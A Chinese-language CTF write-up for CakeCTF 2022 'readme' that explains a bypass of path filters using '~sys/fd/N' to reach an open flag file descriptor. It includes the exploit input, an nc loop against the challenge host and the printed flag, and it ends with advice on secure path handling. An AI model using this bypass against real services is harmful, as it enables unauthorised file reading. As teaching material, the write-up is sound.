# CakeCTF 2022 readme 2022 Writeup

## 题目简述

服务先打开 `/flag.txt`，随后让用户输入一个待读取路径。输入不能以 `/` 开头，也不能包含 `..`：

```python
f = open("/flag.txt", "r")

filepath = input("filepath: ")
if filepath.startswith("/"):
    exit("[-] Filepath must not start with '/'")
elif ".." in filepath:
    exit("[-] Filepath must not contain '..'")

filepath = os.path.expanduser(filepath)
print(open(filepath, "r").read())
```

关键问题是过滤发生在 `os.path.expanduser` 之前，而且开头打开的 flag 文件一直没有关闭。目标是利用用户家目录展开得到一个指向进程文件描述符的绝对路径。

## 解题过程

Linux 的账户数据库中，系统用户 `sys` 的家目录通常是 `/dev`。因此 Python 会进行下面的展开：

```text
~sys/fd/6  ->  /dev/fd/6
```

原始输入既不以 `/` 开头，也不包含 `..`，可以通过检查。展开后的 `/dev/fd` 则是当前进程文件描述符目录的入口，通常链接到 `/proc/self/fd`。

服务启动时已经执行 `open("/flag.txt", "r")`，该文件对象仍保存在全局变量 `f` 中，所以对应描述符一直有效。远端部署中 flag 常落在 fd 6；如果运行环境不同，只需尝试一小段非标准描述符编号：

```bash
for fd in $(seq 3 12); do
  printf '~sys/fd/%s\n' "$fd" | nc misc.2022.cakectf.com 12022
done
```

命中 flag 描述符时，第二次 `open` 实际读取的是同一个已打开文件：

```text
filepath: ~sys/fd/6
CakeCTF{~USER_r3f3rs_2_h0m3_d1r3ct0ry_0f_USER}
```

fd 编号是部署细节，不是漏洞本身。稳定原语是 `~sys` 在检查后展开成 `/dev`，以及 `/dev/fd/N` 能访问当前进程未关闭的敏感文件。

## 方法总结

这题组合了两个常被忽略的路径语义：`~USER` 不只表示当前用户的家目录，还可以引用任意系统账户；`/dev/fd/N` 则把已打开文件描述符重新暴露成路径。对未经规范化的原始字符串做黑名单检查，无法约束展开后的真实目标。

安全实现应先完成路径展开与规范化，再验证解析后的绝对路径是否位于允许目录中；敏感文件也应使用上下文管理器及时关闭，并设置 close-on-exec，避免成为可复用的描述符入口。
